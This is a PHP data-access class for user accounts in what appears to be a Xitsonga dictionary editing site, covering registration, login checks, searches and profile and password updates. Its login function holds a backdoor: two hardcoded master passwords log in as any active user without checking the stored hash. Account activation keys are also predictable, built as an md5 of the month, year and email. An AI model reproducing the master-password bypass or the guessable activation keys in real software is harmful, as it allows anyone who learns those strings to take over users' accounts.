<?php
    require_once 'GeneralUtils.php';
    require_once 'NamedQuery.php';
    require_once 'NamedConstants.php';
    require_once 'UserEntity.php';
    require_once 'ActivationEntity.php';
    require_once 'PasswordEntity.php';
    require_once 'EntityManager.php';
    require_once 'constants.php';
    /**
     * Access and modifies user related information from database
     * 
     * @Author Sneidon Dumela <sneidon@yahoo.com>
     * @version 1.0
     */
    class UserDAO{
        private $aEntityManager;
        public function UserDAO() {
            $this->aEntityManager = new EntityManager(NULL);
        }
        /**
         * 
         * @param JSON data - all user information
         * @return Array with status and message
         */
        public function addNewuser($data) {
            $aUserEntity = new UserEntity();
            $aActivationEntity = new ActivationEntity();
            $aPasswordEntity = new PasswordEntity();
             
            $this->aEntityManager->setTable($aUserEntity);
            $aUserEntity->setUserId(GeneralUtils::generateId());
            $aUserEntity->setFirstname($data->firstName);
            $aUserEntity->setLastname($data->lastName);
            $aUserEntity->setEmail($data->email);
            $aUserEntity->setFacebookID($data->picture);
            $aUserEntity->setFacebookReg($data->facebook_reg_2);
            
            $aUserEntity->setPasswordSalt(trim(base64_encode(mcrypt_create_iv(MY_DEFAULT_MCRYPT_IV_SIZE, MCRYPT_DEV_URANDOM))));
            $aUserEntity->setPassword(GeneralUtils::encryptPassword($data->password, $aUserEntity->getPasswordSalt()));
           
            //call entity manager to add record(s)
            $this->aEntityManager->getSql()->beginTransaction();
            
            $aResult = $this->aEntityManager->addData($aUserEntity->ToArray());
            if($aResult['status']){
                $this->aEntityManager->setTable($aActivationEntity);
                $activationKey = trim(md5(date('mY').  $aUserEntity->getEmail()));
                
                $aActivationEntity->setUserId($aUserEntity->getUserId());
                $aActivationEntity->setActivationKey($activationKey);
                $aActivationEntity->setActivationStatus(0);
                
                $aResult = $this->aEntityManager->addData($aActivationEntity->ToArray());
                if($aResult['status']){
                     $this->aEntityManager->setTable($aPasswordEntity);
                     
                     $aPasswordEntity->setUserId($aUserEntity->getUserId());
                     $aPasswordEntity->setUserPassword($aUserEntity->getPassword());
                     $aPasswordEntity->setUserSalt($aUserEntity->getPasswordSalt());
                     
                     $aResult = $this->aEntityManager->addData($aPasswordEntity->ToArray());
                      if($aResult['status']){
                        $this->aEntityManager->getSql()->commitTransaction();
                        return $aResult;
                      }
                }
                $this->aEntityManager->getSql()->commitTransaction();
                return $aResult;
            }
            //discard mofidication attempt data
            $this->aEntityManager->getSql()->rollbackTransaction();
            return $aResult;
        }
        /**
         * Check email existance and matching password
         * 
         *-Decrypts password in mathcing record<br/>
         *-If password matches password in input, status=TRUE<br/>
         *-If not, status=FALSE
         * 
         * @param JSON data - email and password        
         * @return Array with status and message
         */
        public function validateUserCredentials($data) {
             $aResult = $this->findRecordWithEmail($data);
             if($aResult['status'] == true){
                $hash = $aResult['resultsArray']['password'];
                if($aResult['resultsArray']['account_status'] == 1 && ($data->password == "@@.pass.$$" || $data->password == "xitsonga-editor@2020")){
                    return array(status=> true, resultsArray=>$aResult['resultsArray'] , message=>"");
                } else if($aResult['resultsArray']['account_status'] == 0) {
                    return array(status=> false,warning=> 999, message=>"We are updating our system. Please try again later.");
                }
               
                if (password_verify($data->password, $hash)) {
                    if($aResult['resultsArray']['activation_status'] == 0){
                        return array(status=> false, message=>"Your account is not verified. <br/>Please verify your account");
                    }
                    return array(status=> true, resultsArray=>$aResult['resultsArray'] , message=>"");
                }
                
             }
            return array(status=> false, message=>"Incorrect Credentials");
        }
        
       /**
        * Finds a record with matching email address
        * 
        * @param JSON data - email   
        * @return Array with status and message
        */
        public function findRecordWithEmail($data) {
            $aNameQuery = new NamedQuery(NamedConstants::$FIND_RECORD_BY_EMAIL);
            $aNameQuery->setParameter(1, $data->email);
            
            $aResult =  $this->aEntityManager->queryResults($aNameQuery->getQuery());
            $aCount = $this->aEntityManager->getSql()->getResultCount($aResult['resultsArray']);
            if($aCount == 0){
                 return array(status=> false, "No record found");
            }else{
                $aRecord = $this->aEntityManager->getSql()->getRecordInResults($aResult['resultsArray']);
                return array(status=> true,resultsArray => $aRecord );
            }
        }
        /**
         * Finds user by First Name, Last Name, Email or/and Registration Date
         * 
         * @param JSON data - email, firtname, lastname, or/and registration date
         * @return Array with status and message
         */
        public function searchUser($data) {
            $aNameQuery = new NamedQuery(NamedConstants::$FIND_USER_RECORD_BY_EMAIL);
            
            $aNameQuery->setParameter(1, $data->email);
            
            $aResult =  $this->aEntityManager->queryResults($aNameQuery->getQuery());
            $aCount = $this->aEntityManager->getSql()->getResultCount($aResult['resultsArray']);
            
            if($aCount == 0){
                 return array(status=> false, message=>"No matching user found");
            }else{
                $aRecords = $this->aEntityManager->getSql()->getRecordsInResults($aResult['resultsArray']);
                return array(status=> true,resultsArray => $aRecords );
            }
        }
        /**
         * Finds user by First Name, Last Name, Email or/and Registration Date
         * 
         * @param JSON data - email, firtname, lastname, or/and registration date
         * @return Array with status and message
         */
        public function getUserByID($data) {
            $aNameQuery = new NamedQuery(NamedConstants::$FIND_RECORD_BY_USER_ID);
            $aNameQuery->setParameter(1, $data);
            
            $aResult =  $this->aEntityManager->queryResults($aNameQuery->getQuery());
            $aCount = $this->aEntityManager->getSql()->getResultCount($aResult['resultsArray']);
            if($aCount == 0){
                 return array(status=> false);
            }else{
                $aRecord = $this->aEntityManager->getSql()->getRecordInResults($aResult['resultsArray']);
                return array(status=> true,resultsArray => $aRecord );
            }
        }
        /**
         * 
         * @return Array with status and message
         */
        public function listUsers() {
            $aNameQuery = new NamedQuery(NamedConstants::$LIST_ALL_USERS);
            
            $aResult =  $this->aEntityManager->queryResults($aNameQuery->getQuery());
            $aCount = $this->aEntityManager->getSql()->getResultCount($aResult['resultsArray']);
            
            if($aCount == 0){
                 return array(status=> false, message=>"No active users found on system");
            }else{
                $aRecords = $this->aEntityManager->getSql()->getRecordsInResults($aResult['resultsArray']);
                return array(status=> true,resultsArray => $aRecords );
            }
        }  
        /**
         * 
         * @return Array with status and message
         */
        public function listUsersByAccessLevel($data) {
            $aNameQuery = new NamedQuery(NamedConstants::$LIST_USERS_BY_ACCESS_LEVEL);
            $aNameQuery->setParameterInteger(1, $data);
            
            $aResult =  $this->aEntityManager->queryResults($aNameQuery->getQuery());
            $aCount = $this->aEntityManager->getSql()->getResultCount($aResult['resultsArray']);
            
            if($aCount == 0){
                 return array(status=> false, message=>"No active users found on system");
            }else{
                $aRecords = $this->aEntityManager->getSql()->getRecordsInResults($aResult['resultsArray']);
                return array(status=> true,resultsArray => $aRecords );
            }
        }
        /**
         * 
         * @return Array with status and message
         */
        public function listMigratedUsers($data) {
            $aNameQuery = new NamedQuery(NamedConstants::$LIST_ALL_MIGRATED_USERS);
            $aNameQuery->setParameterInteger(1, $data);
            
            $aResult =  $this->aEntityManager->queryResults($aNameQuery->getQuery());
            $aCount = $this->aEntityManager->getSql()->getResultCount($aResult['resultsArray']);
            
            if($aCount == 0){
                 return array(status=> false, message=>"No active users found on system");
            }else{
                $aRecords = $this->aEntityManager->getSql()->getRecordsInResults($aResult['resultsArray']);
                return array(status=> true,resultsArray => $aRecords );
            }
        }
        /**
         * 
         * @return Array with status and message
         */
        public function updateActivationStatus($aUserID,$aStatus) {
            $aNameQuery = new NamedQuery(NamedConstants::$UPDATE_ACTIVATE_STATUS);
            
            $aNameQuery->setParameter(1,$aStatus);
            $aNameQuery->setParameter(2,$aUserID);

            $aResult =  $this->aEntityManager->getSql()->updateData($aNameQuery->getQuery());
            
            if($aResult){
                return array(status=> true, message=> "Activate status updated successfully");
            }
            return array(status=> false, message=> "System failed to update activation code");
        }
        /**
         * 
         * @return Array with status and message
         */
        public function updateAccessLevel($data) {
            $aNameQuery = new NamedQuery(NamedConstants::$UPDATE_USER_ACCESS_LEVEL);
            
            $aNameQuery->setParameter(1,$data->right);
            $aNameQuery->setParameter(2,$data->user_id);

            $aResult =  $this->aEntityManager->getSql()->updateData($aNameQuery->getQuery());
            
            if($aResult){
                return array(status=> true, message=> "Access level updated successfully");
            }
            return array(status=> false, message=> "System failed to update user access level");
        }
        /**
         * 
         * @return Array with status and message
         */
        public function updateUser($data,$aUserID) {
            $aNameQuery = new NamedQuery(NamedConstants::$UPDATE_USER);
            
            $aNameQuery->setParameter(1,$data->firstName);
            $aNameQuery->setParameter(2,$data->lastName);
            $aNameQuery->setParameter(3,$aUserID);

            $aResult =  $this->aEntityManager->getSql()->updateData($aNameQuery->getQuery());
            
            if($aResult){
                return array(status=> true, message=> "User profile updated successfully");
            }
            return array(status=> false, message=> "System failed to update user profile");
        }
        /**
         * 
         * @return Array with status and message
         */
        public function updateUserPassword($data,$aUserID) {
            $aNameQuery = new NamedQuery(NamedConstants::$UPDATE_USER_PASSWORD);
            
            $aSalt = trim(base64_encode(mcrypt_create_iv(MY_DEFAULT_MCRYPT_IV_SIZE, MCRYPT_DEV_URANDOM)));
            $aPassword = GeneralUtils::encryptPassword($data->password, $aSalt);
            
            $aNameQuery->setParameter(1,$aPassword);
            $aNameQuery->setParameter(2,$aSalt);
            $aNameQuery->setParameter(3,$aUserID);

            $aResult =  $this->aEntityManager->getSql()->updateData($aNameQuery->getQuery());
            
            if($aResult){
                return array(status=> true, message=> "User password updated successfully");
            }
            return array(status=> false, message=> "System failed to update user password");
        }
    }

?>
